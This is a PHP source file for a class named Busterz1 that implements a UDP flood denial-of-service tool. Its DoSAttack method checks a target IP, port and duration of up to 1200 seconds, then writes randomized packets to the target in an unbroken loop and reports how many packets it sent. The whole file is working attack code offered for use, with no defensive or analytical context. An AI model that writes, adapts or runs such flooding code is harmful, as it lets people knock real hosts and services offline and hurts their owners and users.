<?php
if(!defined('priv')){
	die('Direct Access not allowed.');
}

class Busterz1{
	private $mintime = 1;
	private $maxtime = 1200;

	private function buildOutput($code, $h, $p, $t, $pktno){
		switch($code){
			case 'host_error':
				return 'Give me a valid IP, please.';
			case 'port_error':
				return 'Give me a valid Port, please.';
			case 'time_error':
				return 'Minimum time is: '.$this->mintime.', Maximum time is: '.$this->maxtime.'.';
			case 'success':
				return 'Successfully flooded '.$h.':'.$p.' for '.$t.' seconds; sent '.$pktno.' packets.';
		}
	}

	private function generateRandStr($length = 10) {
	    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
	}

	private function buildPacket($pkt){
		$pkt = str_replace('!rand!', $this->generateRandStr(rand(10,20)), $pkt);
		$pkt .= "\r\nUsing https://github.com/lulzamp/Busterz1.class";
		return $pkt;
	}

	public function DoSAttack($h, $p, $t, $packet){
		if(!filter_var($h, FILTER_VALIDATE_IP)){
			return $this->buildOutput('host_error');
		}
		if($p > 65535 || $p < 1){
			return $this->buildOutput('port_error');
		}
		if($t > $this->maxtime || $t < $this->mintime){
			return $this->buildOutput('time_error');
		}
		$packet = $this->buildPacket($packet);
		
		$i = 0;
		$fp = fsockopen('udp://'.$h, $p, $errno, $errstr);
		$exec_time = time() + $t;
		while(1){
			if(time() == $exec_time){
				return $this->buildOutput('success', $h, $p, $t, $i);
			}

			$sent = fwrite($fp, $packet);
			if($sent){
				$i++;
			}
		}
	}
}